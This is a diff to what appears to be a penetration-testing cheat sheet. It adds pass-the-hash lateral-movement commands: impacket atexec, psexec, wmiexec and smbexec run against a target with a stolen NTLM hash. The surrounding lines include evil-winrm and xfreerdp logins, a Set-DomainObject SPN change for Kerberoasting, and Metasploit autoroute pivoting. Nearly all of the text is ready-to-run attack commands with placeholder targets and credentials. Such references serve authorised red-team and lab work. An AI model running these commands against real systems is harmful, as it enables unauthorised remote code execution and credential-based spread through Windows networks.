@@ -398,6 +398,7 @@ xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
 xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
 
 [*] (5985) WINRM
+impacket-wmiexec '$USERNAME'@$TARGET -hashes '$HASH'
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
@@ -518,6 +519,12 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 # Lateral Movement
 ## Linux
 ## Windows
+[*] Pass The Hash
+impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
+
 [*] Metasploit
 run post/multi/manage/autoroute
 run post/multi/manage/autoroute ACTION=delete
